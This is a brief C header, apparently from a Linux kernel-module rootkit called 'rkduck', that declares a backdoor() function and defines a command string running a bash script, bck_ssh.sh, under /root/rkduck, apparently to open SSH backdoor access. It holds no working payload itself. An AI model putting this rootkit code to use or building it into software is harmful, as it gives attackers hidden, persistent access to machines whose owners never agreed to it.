#ifndef _BACKDOOR_H_
#define _BACKDOOR_H_

#include <linux/module.h>

#define ALLOW_SSH 0
#define BCK_SSH "/bin/bash /root/rkduck/bck_ssh.sh"

void backdoor(void);

#endif /* _BACKDOOR_H_ */